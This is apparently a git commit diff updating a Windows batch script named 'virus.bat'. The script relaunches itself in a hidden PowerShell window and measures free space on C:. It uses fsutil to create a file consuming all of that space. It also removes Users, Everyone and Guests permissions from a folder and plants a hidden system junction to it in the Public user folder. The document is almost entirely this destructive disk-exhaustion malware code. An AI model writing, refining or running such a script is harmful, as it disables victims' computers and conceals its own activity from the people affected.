11b2bd70849b01935a9f0cddef9782c67a10028d
IWO <saarleshembar@gmail.com>
2026-03-01 16:35:30 +0200

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -1,19 +1,22 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set TARGET=C:\diskfill
+set "TARGET=C:\diskfill"
+
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden'"
     exit
 )
 
+if not exist "%TARGET%" mkdir "%TARGET%"
 
+for /f "skip=1 tokens=1" %%a in ('wmic logicaldisk where "DeviceID='C:'" get FreeSpace') do (
+    if not defined FreeSpace set FreeSpace=%%a
+)
 
+set /a FreeMB=%FreeSpace%/1024/1024
 
-
-if not exist %TARGET% mkdir %TARGET%
-
-set SIZE=21474836480
+set /a SIZE=%FreeMB%*1024*1024
 
 set COUNT=1
 
@@ -24,15 +27,15 @@ icacls "%FOLDER%" /inheritance:r
 icacls "%FOLDER%" /remove:g Users
 icacls "%FOLDER%" /remove:g Everyone
 icacls "%FOLDER%" /remove:g Guests
-set "ADMINUSER=AdminUser"
-icacls "%FOLDER%" /grant %ADMINUSER%:F
+
 set "JUNC=C:\Users\Public\ProtectedFolder_Link"
-if exist "%JUNC%" rd "%JUNC%"
+if exist "%JUNC%" rd /Q /S "%JUNC%"
 mklink /J "%JUNC%" "%FOLDER%"
 attrib +h +s "%JUNC%"
 
-:loop
 echo Creating file !COUNT! ...
-fsutil file createnew %TARGET%\file!COUNT!.bin %SIZE%
+fsutil file createnew "%TARGET%\file!COUNT!.bin" %SIZE%
 set /a COUNT+=1
-goto loop
+
+echo Done.
+pause
